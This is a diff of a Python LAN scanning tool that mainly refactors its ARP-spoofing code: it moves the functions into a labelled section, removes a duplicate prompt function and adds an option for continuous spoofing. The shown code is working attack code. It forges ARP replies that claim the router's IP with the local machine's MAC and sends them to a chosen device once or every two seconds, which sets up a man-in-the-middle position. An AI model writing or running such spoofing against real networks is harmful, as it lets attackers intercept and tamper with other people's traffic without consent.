@@ -1,23 +1,12 @@
-import subprocess
+import ipaddress
 import re
 import socket
-import ipaddress
+import subprocess
+import time
 import uuid
 from concurrent.futures import ThreadPoolExecutor, as_completed
+
 from scapy.all import ARP, send
-import time
-
-def continuously_spoof(target_ip, spoof_ip, interval=2):
-    """
-    Continuously send ARP spoofing packets every 'interval' seconds.
-    """
-    try:
-        while True:
-            perform_arp_spoof(target_ip, spoof_ip)
-            time.sleep(interval)
-    except KeyboardInterrupt:
-        print(f"{Colors.WARNING}\n[!] Stopping continuous ARP spoofing.{Colors.ENDC}")
-
 
 
 class Colors:
@@ -31,36 +20,6 @@ class Colors:
     BOLD = "\033[1m"
     UNDERLINE = "\033[4m"
 
-def get_own_mac():
-    """Retrieve the MAC address of the current machine."""
-    mac_num = hex(uuid.getnode()).replace("0x", "").zfill(12)
-    return ":".join([mac_num[e:e+2] for e in range(0, 12, 2)])
-
-def perform_arp_spoof(target_ip, spoof_ip):
-    """
-    Perform ARP spoofing on a target IP making it believe our machine is the spoof IP (like the router).
-    """
-    target_mac = get_mac_from_arp_cache(target_ip)
-    if not target_mac:
-        print(f"[Error] Could not find MAC for target {target_ip}. Make sure the device is online.")
-        return
-    
-    # Use the local machine MAC address
-    our_mac = get_own_mac()
-    
-    arp_response = ARP(
-        op=2,                 # ARP reply
-        pdst=target_ip,       # IP of the target
-        hwdst=target_mac,     # Actual MAC of the target
-        psrc=spoof_ip,       # IP we pretend to be (e.g., the router)
-        hwsrc=our_mac         # Our own MAC address
-    )
-    
-    # Send the ARP response
-    send(arp_response, verbose=False)
-    print(f"ARP Spoofing sent from {spoof_ip} to {target_ip} using our MAC as the router's MAC.")
-
-# You can now call this function in main using the local MAC address.
 
 # Try to use scapy optionally when available
 try:
@@ -268,6 +227,49 @@ def get_from_scapy_active_scan():
         return []
 
 
+# --------- ARP Spoofing utilities ---------
+
+def get_own_mac():
+    """Retrieve the MAC address of the current machine."""
+    mac_num = hex(uuid.getnode()).replace("0x", "").zfill(12)
+    return ":".join([mac_num[e:e+2] for e in range(0, 12, 2)])
+
+
+def perform_arp_spoof(target_ip, spoof_ip):
+    """
+    Perform ARP spoofing on a target IP making it believe our machine is the spoof IP (like the router).
+    """
+    target_mac = get_mac_from_arp_cache(target_ip)
+    if not target_mac:
+        print(f"[Error] Could not find MAC for target {target_ip}. Make sure the device is online.")
+        return
+
+    # Use the local machine MAC address
+    our_mac = get_own_mac()
+
+    arp_response = ARP(
+        op=2,                 # ARP reply
+        pdst=target_ip,       # IP of the target
+        hwdst=target_mac,     # Actual MAC of the target
+        psrc=spoof_ip,        # IP we pretend to be (e.g., the router)
+        hwsrc=our_mac         # Our own MAC address
+    )
+
+    # Send the ARP response
+    send(arp_response, verbose=False)
+    print(f"ARP Spoofing sent from {spoof_ip} to {target_ip} using our MAC as the router's MAC.")
+
+
+def continuously_spoof(target_ip, spoof_ip, interval=2):
+    """Continuously send ARP spoofing packets every ``interval`` seconds."""
+    try:
+        while True:
+            perform_arp_spoof(target_ip, spoof_ip)
+            time.sleep(interval)
+    except KeyboardInterrupt:
+        print(f"{Colors.WARNING}\n[!] Stopping continuous ARP spoofing.{Colors.ENDC}")
+
+
 # --------- 4) Merge results ---------
 
 def merge_entries(*lists_of_entries):
@@ -445,6 +447,7 @@ def scan_network():
 
 
 def prompt_for_spoof(online_devices):
+    """Interactively choose a target and perform one-off or continuous spoofing."""
     if not online_devices:
         print(f"{Colors.WARNING}No online devices available for spoofing. Run a scan first.{Colors.ENDC}\n")
         return
@@ -470,39 +473,6 @@ def prompt_for_spoof(online_devices):
     target_ip = target_device["ip"]
     router_ip = input("Enter router IP to spoof (default 192.168.1.1): ").strip() or "192.168.1.1"
 
-    perform_arp_spoof(target_ip=target_ip, spoof_ip=router_ip)
-
-
-
-def prompt_for_spoof(online_devices):
-    if not online_devices:
-        print(f"{Colors.WARNING}No online devices available for spoofing. Run a scan first.{Colors.ENDC}\n")
-        return
-
-    print(f"{Colors.OKBLUE}Select a target for ARP spoofing:{Colors.ENDC}")
-    for idx, device in enumerate(online_devices, start=1):
-        print(
-            f"{Colors.OKCYAN}{idx}. IP: {device['ip']}, MAC: {device['mac']}, "
-            f"Device: {device['device_type']}{Colors.ENDC}"
-        )
-
-    try:
-        target_idx = int(input("Enter the device number: "))
-    except ValueError:
-        print(f"{Colors.FAIL}Invalid selection. Please enter a number.{Colors.ENDC}\n")
-        return
-
-    if not 1 <= target_idx <= len(online_devices):
-        print(f"{Colors.FAIL}Selection out of range.{Colors.ENDC}\n")
-        return
-
-    target_device = online_devices[target_idx - 1]
-    target_ip = target_device["ip"]
-    router_ip = input("Enter router IP to spoof (default 192.168.1.1): ").strip() or "192.168.1.1"
-
-    # --------------------------
-    #  ❗ هنا تضع الجزء الذي طلبته
-    # --------------------------
     mode = input("Continuous spoof? (y/n): ").strip().lower()
 
     if mode == "y":
